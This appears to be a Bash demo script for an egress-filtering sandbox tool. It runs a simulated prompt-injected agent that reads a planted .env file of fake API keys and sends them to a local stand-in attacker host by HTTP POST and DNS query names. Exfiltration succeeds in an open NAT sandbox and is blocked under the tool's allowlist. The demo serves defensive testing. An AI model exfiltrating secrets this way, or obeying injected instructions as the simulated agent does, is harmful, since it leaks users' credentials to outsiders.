#!/usr/bin/env bash
# sandwall demo: one prompt-injected agent, two sandboxes.
#
#   (a) an "open" sandbox: its own netns with plain NAT, like most sandboxes.
#       The agent reads a planted .env and exfiltrates it by HTTP POST and
#       through DNS query names. Both succeed.
#   (b) an sandwall sandbox with an allowlist for pypi/GitHub. The same agent
#       gets nothing out; the deny log and metrics show what it tried.
#
# The "attacker" is a local listener in its own netns at 10.99.0.1, so the
# demo needs no internet access for the exfiltration itself.
#
# Usage (root, Linux): sudo SANDWALL=$PWD/bin/sandwall demo/exfil.sh
set -uo pipefail

DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DEMO_DIR/../test/e2e/lib.sh"
ATTACKER_DNS_PORT=53 # the attacker runs a real nameserver for the DNS channel

OPEN_NS=demo-open
ORIG_FWD=$(sysctl -n net.ipv4.ip_forward)

if [[ -t 1 ]]; then BOLD=$'\e[1m' RED=$'\e[31m' GREEN=$'\e[32m' DIM=$'\e[2m' RESET=$'\e[0m'; else BOLD= RED= GREEN= DIM= RESET=; fi
step() { printf '\n%s== %s%s\n' "$BOLD" "$*" "$RESET"; }
note() { printf '%s%s%s\n' "$DIM" "$*" "$RESET"; }

cleanup() {
	stop_daemon
	"$SANDWALL" "${G[@]}" nuke >/dev/null 2>&1
	ip netns pids "$OPEN_NS" 2>/dev/null | xargs -r kill 2>/dev/null
	ip link del dm-open0 2>/dev/null
	ip netns del "$OPEN_NS" 2>/dev/null
	rm -rf "/etc/netns/$OPEN_NS"
	nft delete table ip sandwall_demo 2>/dev/null
	sysctl -qw net.ipv4.ip_forward="$ORIG_FWD"
	teardown_attacker
	rm -rf "$T"
}
trap cleanup EXIT

# The agent's workspace with planted secrets, readable by the unprivileged agent.
chmod 711 "$T"
mkdir -p "$T/work"
cat >"$T/work/.env" <<'EOF'
OPENAI_API_KEY=sk-demo-9f2c1e7ab04d4c6e8a3b5d7f1e2c3a4b
AWS_SECRET_ACCESS_KEY=demo/K7MDENG+bPxRfiCYEXAMPLEKEY
EOF
cp "$DEMO_DIR/agent.py" "$T/work/agent.py"
chmod 755 "$T/work"
chmod 644 "$T/work/.env" "$T/work/agent.py"
AGENT=(python3 "$T/work/agent.py" --env "$T/work/.env" --url "http://$ATTACKER_IP:$ATTACKER_PORT/collect")
as_nobody=(setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all --bounding-set=-all --no-new-privs --)

"$SANDWALL" "${G[@]}" nuke >/dev/null
setup_attacker || exit 1

step "(a) open sandbox: own netns, NAT to anywhere"
ip netns add "$OPEN_NS"
ip link add dm-open0 type veth peer name dm-open1
ip link set dm-open1 netns "$OPEN_NS"
ip addr add 10.250.0.1/30 dev dm-open0
ip link set dm-open0 up
ip -n "$OPEN_NS" addr add 10.250.0.2/30 dev dm-open1
ip -n "$OPEN_NS" link set dm-open1 up
ip -n "$OPEN_NS" link set lo up
ip -n "$OPEN_NS" route add default via 10.250.0.1
sysctl -qw net.ipv4.ip_forward=1
nft -f - <<'EOF'
table ip sandwall_demo {
	chain postrouting {
		type nat hook postrouting priority srcnat; policy accept;
		ip saddr 10.250.0.0/30 masquerade
	}
}
EOF
# A resolver the agent can reach; here it is the attacker's own nameserver,
# standing in for any recursive resolver that forwards to it.
mkdir -p "/etc/netns/$OPEN_NS"
echo "nameserver $ATTACKER_IP" >"/etc/netns/$OPEN_NS/resolv.conf"
: >"$ATTACKER_LOOT"
ip netns exec "$OPEN_NS" "${as_nobody[@]}" "${AGENT[@]}"
note "attacker received:"
if [[ -s "$ATTACKER_LOOT" ]]; then
	printf '%s' "$RED"; sed 's/^/    /' "$ATTACKER_LOOT"; printf '%s' "$RESET"
	printf '%s=> secrets exfiltrated%s\n' "$RED$BOLD" "$RESET"
fi

step "(b) sandwall sandbox: default deny, allowlist $(grep -c '^    - ' "$DEMO_DIR/policy.yaml") domains"
start_daemon || exit 1
"$SANDWALL" "${G[@]}" sandbox create agent --policy "$DEMO_DIR/policy.yaml"
: >"$ATTACKER_LOOT"
"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}"
sleep 1
note "attacker received:"
if [[ -s "$ATTACKER_LOOT" ]]; then
	sed 's/^/    /' "$ATTACKER_LOOT"
	printf '%s=> LEAK%s\n' "$RED$BOLD" "$RESET"
	exit 1
fi
printf '    (nothing)\n%s=> nothing left the sandbox%s\n' "$GREEN$BOLD" "$RESET"

note "sandwall logs agent --deny-only:"
"$SANDWALL" "${G[@]}" logs agent --deny-only |
	jq -r '"    \(.ts[11:23])  \(.type)  \(.verdict)/\(.reason // "-")  \(if .qname then "\(.qtype) \(.qname)" else "\(.proto) \(.dst_ip):\(.dst_port)" end)"'
note "metrics (curl :9464/metrics):"
curl -s http://127.0.0.1:19464/metrics | grep -E '^sandwall_(denied_total|dns_queries_total)\{.*sandbox="agent"' | sed 's/^/    /'

step "the agent can still do its job"
code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>&1)
printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"
